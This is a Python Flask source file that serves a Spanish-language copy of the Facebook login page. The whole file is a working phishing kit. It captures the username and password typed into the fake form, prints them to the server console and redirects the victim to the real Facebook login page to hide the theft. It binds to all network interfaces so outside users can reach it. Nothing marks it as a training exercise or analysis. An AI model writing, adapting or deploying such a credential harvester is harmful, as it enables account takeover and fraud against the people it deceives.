from flask import Flask, request, redirect, url_for
import requests

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        print(f"Usuario: {username}, Contraseña: {password}")
        
        return redirect('https://m.facebook.com/login/')
    
    return '''
    <!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sessión en Facebook</title>
    <link rel="icon" type="image/png" href="/static/facebook.png">
    <style>
        body {
    font-family: Arial, sans-serif;
    background-color: #f0f2f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.container {
    text-align: center;
    margin-bottom: 30px; /* Para el texto fuera del contenedor */
}

h1.h1 {
    color: #1877f2;
    font-size: 48px;
    margin-bottom: 10px;
}

.login-container {
    background-color: #fff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    width: 300px;
    text-align: center;
}

h3 {
    color: #333;
    margin-bottom: 20px;
}

.login-container input[type="text"],
.login-container input[type="password"] {
    width: 100%;
    padding: 10px 12px; /* Relleno interno a los lados */
    margin: 10px 0;
    border: 1px solid #dddfe2;
    border-radius: 4px;
    font-size: 14px;
    box-sizing: border-box; /* Asegura que el padding no afecte el tamaño del input */
}
.login-container input[type="submit"] {
    width: 100%;
    padding: 10px;
    background-color: #1877f2;
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 16px;
    cursor: pointer;
}

.login-container input[type="submit"]:hover {
    background-color: #165fc2;
}

.login-container label {
    display: block;
    margin-top: 15px;
    color: #1877f2;
    cursor: pointer;
    font-size: 12px;
}

.login-container .separator {
    margin: 20px 0;
    display: flex;
    align-items: center;
    justify-content: center;
}

.login-container .separator::before,
.login-container .separator::after {
    content: '';
    flex: 1;
    border-bottom: 1px solid #ccc;
}

.login-container .separator::before {
    margin-right: 10px;
}

.login-container .separator::after {
    margin-left: 10px;
}

button {
    width: 100%;
    padding: 10px;
    background-color: #42b72a;
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 16px;
    cursor: pointer;
    margin-top: 10px;
}

button:hover {
    background-color: #36a420;
}
    </style>
</head>
<body>
    <div class ="container">
    <h1 class="h1">facebook</h1>
    <div class="login-container">
        <h3>Iniciar Sesión en facebook</h3>
        <form action="" method="post">
        <input type="text" name="username" placeholder="Nombre de usuario">
        <input type="password" name="password" placeholder="Contraseña">
        <input type="submit" value="Iniciar sesión">
        </form>
        <label class="label">¿Olvide mi contraseña?</label>
        <label class="label">                        </label>
        <div class="separator">o</div> <!-- Separador con las líneas ---------- o ---------- -->

        <button class="label">Registrarse</button>
    </div>
    </div>
</body>
</html>
    '''

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)

